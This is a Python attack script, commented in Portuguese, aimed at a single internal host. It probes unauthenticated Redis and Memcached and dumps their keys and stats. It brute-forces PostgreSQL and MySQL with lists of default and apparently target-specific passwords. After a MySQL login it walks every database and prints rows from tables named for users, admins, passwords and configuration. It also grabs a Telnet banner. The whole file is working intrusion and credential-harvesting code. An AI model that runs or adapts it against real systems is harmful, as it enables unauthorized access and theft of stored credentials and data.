import socket
import sys

HOST = "172.30.1.12"
results = []

def test_tcp(port, name, send=None, timeout=3):
    """Testa conexão TCP e opcionalmente envia dados"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((HOST, port))
        banner = ""
        try:
            banner = s.recv(4096).decode("utf-8", errors="replace")
        except:
            pass
        if send:
            s.sendall(send.encode())
            try:
                resp = s.recv(4096).decode("utf-8", errors="replace")
                s.close()
                return banner, resp
            except:
                pass
        s.close()
        return banner, None
    except Exception as e:
        return None, str(e)

# ==========================================
# 1. REDIS (6379) - Geralmente sem senha
# ==========================================
print("=" * 50)
print("  REDIS (porta 6379)")
print("=" * 50)
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((HOST, 6379))
    
    # Tentar PING (funciona sem auth)
    s.sendall(b"PING\r\n")
    resp = s.recv(1024).decode("utf-8", errors="replace")
    print(f"  PING => {resp.strip()}")
    
    if "PONG" in resp:
        print("  *** REDIS SEM AUTENTICACAO! ***")
        results.append(("Redis", "SEM AUTH", "ABERTO"))
        
        s.sendall(b"INFO server\r\n")
        resp = s.recv(4096).decode("utf-8", errors="replace")
        print(f"  INFO => {resp[:300]}")
        
        s.sendall(b"KEYS *\r\n")
        resp = s.recv(4096).decode("utf-8", errors="replace")
        print(f"  KEYS => {resp[:500]}")
        
    elif "NOAUTH" in resp or "AUTH" in resp:
        print("  Redis pede senha. Tentando senhas comuns...")
        passwords = ["", "redis", "admin", "root", "password", "123456", "emporium", "default"]
        for pw in passwords:
            s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s2.settimeout(3)
            s2.connect((HOST, 6379))
            s2.sendall(f"AUTH {pw}\r\n".encode())
            r = s2.recv(1024).decode("utf-8", errors="replace")
            if "+OK" in r:
                print(f"  *** REDIS SENHA: {pw} ***")
                results.append(("Redis", pw, "AUTH OK"))
                s2.sendall(b"KEYS *\r\n")
                r2 = s2.recv(4096).decode("utf-8", errors="replace")
                print(f"  KEYS => {r2[:500]}")
                s2.close()
                break
            s2.close()
        else:
            results.append(("Redis", "-", "AUTH REQUIRED"))
    s.close()
except Exception as e:
    print(f"  Erro: {e}")
    results.append(("Redis", "-", f"ERRO: {e}"))

# ==========================================
# 2. MEMCACHED (11211) - Nunca tem senha
# ==========================================
print("\n" + "=" * 50)
print("  MEMCACHED (porta 11211)")
print("=" * 50)
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((HOST, 11211))
    s.sendall(b"stats\r\n")
    resp = s.recv(4096).decode("utf-8", errors="replace")
    if "STAT" in resp:
        print("  *** MEMCACHED SEM AUTH! ***")
        lines = resp.strip().split("\r\n")[:15]
        for line in lines:
            print(f"  {line}")
        results.append(("Memcached", "SEM AUTH", "ABERTO"))
        
        # Tentar ler chaves
        s.sendall(b"stats items\r\n")
        resp2 = s.recv(4096).decode("utf-8", errors="replace")
        print(f"\n  stats items => {resp2[:300]}")
    else:
        print(f"  Resposta: {resp[:200]}")
        results.append(("Memcached", "-", resp[:50]))
    s.close()
except Exception as e:
    print(f"  Erro: {e}")
    results.append(("Memcached", "-", f"ERRO: {e}"))

# ==========================================
# 3. PostgreSQL (5432)
# ==========================================
print("\n" + "=" * 50)
print("  POSTGRESQL (porta 5432)")
print("=" * 50)
try:
    import struct
    users_pg = ["postgres", "admin", "root", "emporium", "adm"]
    for user in users_pg:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((HOST, 5432))
            
            # PostgreSQL startup message
            user_bytes = user.encode() + b"\x00"
            db_bytes = b"postgres\x00"
            params = b"user\x00" + user_bytes + b"database\x00" + db_bytes + b"\x00"
            length = 4 + 4 + len(params)
            msg = struct.pack("!II", length, 196608) + params
            s.sendall(msg)
            
            resp = s.recv(4096)
            resp_char = chr(resp[0]) if resp else ""
            
            if resp_char == "R":
                auth_type = struct.unpack("!I", resp[5:9])[0] if len(resp) >= 9 else -1
                if auth_type == 0:
                    print(f"  *** POSTGRES LOGIN SEM SENHA: {user} ***")
                    results.append(("PostgreSQL", f"{user}/(sem senha)", "AUTH OK"))
                    break
                elif auth_type == 3:
                    print(f"  User {user}: pede senha em texto claro")
                    # Tentar senhas
                    for pw in [user, "postgres", "admin", "123456", "emporium", "adm", ""]:
                        try:
                            s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s2.settimeout(3)
                            s2.connect((HOST, 5432))
                            s2.sendall(msg)
                            s2.recv(4096)
                            pw_msg = b"p" + struct.pack("!I", 4 + len(pw) + 1) + pw.encode() + b"\x00"
                            s2.sendall(pw_msg)
                            r2 = s2.recv(4096)
                            if r2 and chr(r2[0]) == "R" and len(r2) >= 9 and struct.unpack("!I", r2[5:9])[0] == 0:
                                print(f"  *** POSTGRES LOGIN: {user}/{pw} ***")
                                results.append(("PostgreSQL", f"{user}/{pw}", "AUTH OK"))
                                break
                            s2.close()
                        except:
                            pass
                elif auth_type == 5:
                    print(f"  User {user}: pede MD5 auth")
                else:
                    print(f"  User {user}: auth type {auth_type}")
            elif resp_char == "E":
                err_msg = resp[5:].decode("utf-8", errors="replace")[:100]
                if "does not exist" not in err_msg:
                    print(f"  User {user}: {err_msg}")
            s.close()
        except Exception as e:
            print(f"  User {user}: {e}")
    else:
        results.append(("PostgreSQL", "-", "AUTH REQUIRED"))
except Exception as e:
    print(f"  Erro geral: {e}")

# ==========================================
# 4. MySQL (3306)
# ==========================================
print("\n" + "=" * 50)
print("  MYSQL (porta 3306)")
print("=" * 50)
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((HOST, 3306))
    banner = s.recv(4096)
    if banner:
        # Parse MySQL greeting
        version_end = banner.find(b"\x00", 5)
        if version_end > 5:
            version = banner[5:version_end].decode("utf-8", errors="replace")
            print(f"  MySQL Version: {version}")
        else:
            print(f"  Banner (hex): {banner[:50].hex()}")
    s.close()
    
    # Tentar com pymysql
    try:
        import pymysql
    except ImportError:
        import subprocess
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pymysql", "-q"])
        import pymysql
    
    creds = [
        ("root", ""), ("root", "root"), ("root", "mysql"), ("root", "123456"),
        ("root", "admin"), ("root", "password"), ("root", "toor"),
        ("admin", "admin"), ("admin", ""), ("admin", "123456"),
        ("emporium", "emporium"), ("emporium", ""), ("emporium", "admin"),
        ("adm", "adm"), ("adm", ""), ("adm", "admin"),
        ("moderator", "moderator"), ("conecto", "conecto"),
        ("mysql", "mysql"), ("user", "user"), ("test", "test")
    ]
    for user, pw in creds:
        try:
            conn = pymysql.connect(host=HOST, user=user, password=pw, connect_timeout=3)
            print(f"  *** MYSQL LOGIN: {user}/{pw} ***")
            results.append(("MySQL", f"{user}/{pw}", "AUTH OK"))
            
            cursor = conn.cursor()
            cursor.execute("SHOW DATABASES")
            dbs = [row[0] for row in cursor.fetchall()]
            print(f"  Databases: {dbs}")
            
            for db in dbs:
                if db not in ("information_schema", "performance_schema", "mysql", "sys"):
                    cursor.execute(f"USE `{db}`")
                    cursor.execute("SHOW TABLES")
                    tables = [row[0] for row in cursor.fetchall()]
                    print(f"  DB {db}: {tables}")
                    for t in tables:
                        tl = t.lower()
                        if any(k in tl for k in ["user", "admin", "login", "auth", "config", "password", "agent"]):
                            cursor.execute(f"SELECT * FROM `{t}` LIMIT 5")
                            rows = cursor.fetchall()
                            cols = [d[0] for d in cursor.description]
                            print(f"\n  *** TABELA: {db}.{t} ***")
                            print(f"  Colunas: {cols}")
                            for row in rows:
                                print(f"  {dict(zip(cols, row))}")
            conn.close()
            break
        except pymysql.err.OperationalError as e:
            code = e.args[0]
            if code == 1045:  # Access denied
                continue
            elif code == 2003:  # Can't connect
                print(f"  MySQL nao acessivel: {e}")
                results.append(("MySQL", "-", "CONNECTION REFUSED"))
                break
        except Exception as e:
            continue
    else:
        print("  Nenhuma credencial padrao funcionou")
        results.append(("MySQL", "-", "AUTH REQUIRED"))

except Exception as e:
    print(f"  Erro: {e}")

# ==========================================
# 5. TELNET (23)
# ==========================================
print("\n" + "=" * 50)
print("  TELNET (porta 23)")
print("=" * 50)
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((HOST, 23))
    import time
    time.sleep(2)
    banner = s.recv(4096).decode("utf-8", errors="replace")
    print(f"  Banner: {banner[:300]}")
    if "login" in banner.lower():
        results.append(("Telnet", "-", "LOGIN PROMPT"))
    s.close()
except Exception as e:
    print(f"  Erro: {e}")
    results.append(("Telnet", "-", f"ERRO: {e}"))

# ==========================================
# RESUMO FINAL
# ==========================================
print("\n" + "=" * 50)
print("  RESUMO FINAL")
print("=" * 50)
for svc, cred, status in results:
    emoji = "✅" if "OK" in status or "ABERTO" in status or "SEM AUTH" in status else "❌"
    print(f"  {emoji} {svc:15s} | {cred:25s} | {status}")
